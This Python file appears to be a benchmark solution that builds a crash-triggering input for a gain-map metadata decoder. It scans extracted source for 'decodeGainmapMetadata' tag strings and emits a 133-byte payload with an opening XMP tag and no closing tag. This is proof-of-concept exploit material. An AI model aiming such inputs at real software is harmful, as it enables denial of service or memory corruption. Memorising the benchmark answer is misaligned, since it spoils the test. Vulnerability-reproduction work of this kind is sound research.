import os
import re
import tarfile
import tempfile
import zipfile
from typing import List, Tuple


def _extract(src_path: str) -> str:
    tmpdir = tempfile.mkdtemp(prefix="src_")
    # Try tarfile
    try:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path) as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            raise Exception("Attempted Path Traversal in Tar File")
                    tar.extractall(path, members, numeric_owner=numeric_owner)
                safe_extract(tf, tmpdir)
            return tmpdir
    except Exception:
        pass
    # Try zipfile
    try:
        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path) as zf:
                zf.extractall(tmpdir)
            return tmpdir
    except Exception:
        pass
    # Fallback: treat src_path as directory
    if os.path.isdir(src_path):
        return src_path
    return tmpdir


def _read_text(path: str) -> str:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""


def _iter_source_files(root: str) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"}
    files = []
    for d, _, fnames in os.walk(root):
        for fn in fnames:
            lf = fn.lower()
            _, ext = os.path.splitext(lf)
            if ext in exts:
                files.append(os.path.join(d, fn))
    return files


def _decode_c_string_literal(s: str) -> str:
    # Remove surrounding quotes
    if len(s) >= 2 and s[0] == '"' and s[-1] == '"':
        s = s[1:-1]
    # Handle escaped sequences
    # We avoid using codecs.decode('unicode_escape') directly due to undefined behavior for unknown sequences,
    # instead handle common escapes.
    res = []
    i = 0
    while i < len(s):
        ch = s[i]
        if ch != '\\':
            res.append(ch)
            i += 1
            continue
        # escape
        i += 1
        if i >= len(s):
            res.append('\\')
            break
        esc = s[i]
        i += 1
        if esc == 'n':
            res.append('\n')
        elif esc == 'r':
            res.append('\r')
        elif esc == 't':
            res.append('\t')
        elif esc == '\\':
            res.append('\\')
        elif esc == '"':
            res.append('"')
        elif esc == "'":
            res.append("'")
        elif esc in '01234567':
            # octal
            oct_digits = esc
            count = 1
            while i < len(s) and count < 3 and s[i] in '01234567':
                oct_digits += s[i]
                i += 1
                count += 1
            try:
                res.append(chr(int(oct_digits, 8)))
            except Exception:
                res.append('?')
        elif esc == 'x':
            # hex
            hex_digits = ''
            while i < len(s) and s[i] in '0123456789abcdefABCDEF':
                hex_digits += s[i]
                i += 1
            if hex_digits:
                try:
                    res.append(chr(int(hex_digits, 16)))
                except Exception:
                    res.append('?')
            else:
                res.append('x')
        else:
            # Unknown escape, keep as is
            res.append(esc)
    return ''.join(res)


def _find_function_files(root: str, name: str) -> List[str]:
    files = _iter_source_files(root)
    res = []
    pat = re.compile(r'\b' + re.escape(name) + r'\s*\(')
    for f in files:
        try:
            txt = _read_text(f)
        except Exception:
            continue
        if pat.search(txt):
            res.append(f)
    return res


def _extract_find_strings_from_text(txt: str) -> List[str]:
    # Capture ".find(" occurrences with string literals
    # Also handle patterns like find(std::string("..."))
    strings = []
    # Limit search to the function scope around decodeGainmapMetadata if possible
    fn_match = re.search(r'\bdecodeGainmapMetadata\s*\(', txt)
    if fn_match:
        # Try to extract function body by brace matching
        start = fn_match.start()
        brace_pos = txt.find('{', fn_match.end())
        if brace_pos != -1:
            depth = 1
            i = brace_pos + 1
            while i < len(txt) and depth > 0:
                if txt[i] == '{':
                    depth += 1
                elif txt[i] == '}':
                    depth -= 1
                i += 1
            body = txt[brace_pos:i]
        else:
            body = txt
    else:
        body = txt
    # Regex to capture find("...") or find(std::string("..."))
    # Consider optional parameters after first argument.
    lit_regex = re.compile(r'\.find\s*\(\s*(?:std::string\s*\(\s*)?("([^"\\]|\\.)*")')
    for m in lit_regex.finditer(body):
        lit = m.group(1)
        try:
            decoded = _decode_c_string_literal(lit)
        except Exception:
            continue
        if decoded:
            strings.append(decoded)
    # Also capture string literals that look like XML tags related to hdrgm/gainmap that may be used indirectly
    extra_lit_regex = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
    for m in extra_lit_regex.finditer(body):
        s = _decode_c_string_literal(m.group(0))
        if any(k in s.lower() for k in ["gainmap", "hdrgm", "gcontainer", "ultrahdr", "hdr", "gain map"]):
            if s not in strings:
                strings.append(s)
    # Deduplicate preserving order
    seen = set()
    uniq = []
    for s in strings:
        if s not in seen:
            seen.add(s)
            uniq.append(s)
    return uniq


def _score_tag_candidate(s: str) -> int:
    ls = s.lower()
    score = 0
    # Prefer longer distinctive markers
    score += min(len(s), 64)
    # Specific keywords
    if "hdrgm" in ls:
        score += 50
    if "gainmap" in ls:
        score += 40
    if "gcontainer" in ls:
        score += 25
    if "<" in s and ">" not in s:
        score += 5
    if "<" in s and ":" in s:
        score += 10
    if ":" in s:
        score += 5
    # Penalize potential closing tags or end markers
    if "</" in s or s.strip().startswith("</"):
        score -= 30
    if s.strip().startswith("/"):
        score -= 20
    # Penalize very generic things
    if ls in ("", " ", "\n"):
        score -= 100
    return score


def _select_start_tag(strings: List[str]) -> str:
    # Rank candidates, prefer likely start tags
    if not strings:
        return ""
    ranked = sorted(((s, _score_tag_candidate(s)) for s in strings), key=lambda x: x[1], reverse=True)
    # Return top non-empty
    for s, _ in ranked:
        if s:
            return s
    return strings[0]


def _generate_payload(start_tag: str, target_len: int = 133) -> bytes:
    if not start_tag:
        # Default common UltraHDR HDR Gain Map XMP start tag, likely used
        start_tag = "<hdrgm:HDRGainMap"
    # Ensure our payload contains the start tag but not common end tags
    avoid_tokens = [
        "</hdrgm:HDRGainMap", "</hdrgm", "/>", "</", "end>", "]]>"
    ]
    # Compose payload: some padding before, start_tag, then filler
    prefix = b"GM"  # small prefix
    tag_bytes = start_tag.encode("latin-1", "ignore")
    # Ensure tag present exactly once
    base = prefix + tag_bytes
    # Avoid including end tokens accidentally
    filler_char = b"A"
    filler_len = max(0, target_len - len(base))
    filler = filler_char * filler_len
    payload = base + filler
    # Check and sanitize: if any avoid token present remove by replacing bytes
    lower_payload = payload.lower()
    for tok in avoid_tokens:
        t = tok.encode("latin-1", "ignore")
        if t in lower_payload:
            payload = payload.replace(t, b"X" * len(t))
    # Guarantee exact length
    if len(payload) < target_len:
        payload += b"B" * (target_len - len(payload))
    elif len(payload) > target_len:
        payload = payload[:target_len]
    return payload


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract(src_path)
        files = _find_function_files(root, "decodeGainmapMetadata")
        strings: List[str] = []
        for f in files:
            txt = _read_text(f)
            if not txt:
                continue
            strings.extend(_extract_find_strings_from_text(txt))
        # Deduplicate
        seen = set()
        uniq = []
        for s in strings:
            if s not in seen:
                seen.add(s)
                uniq.append(s)
        start_tag = _select_start_tag(uniq)
        # Generate payload with expected length near ground-truth
        payload = _generate_payload(start_tag, target_len=133)
        # As a safety fallback, if no function found and payload seems too generic, craft a second variant
        if not files:
            alt = _generate_payload("<hdrgm:HDRGainMap", target_len=133)
            if alt:
                payload = alt
        return payload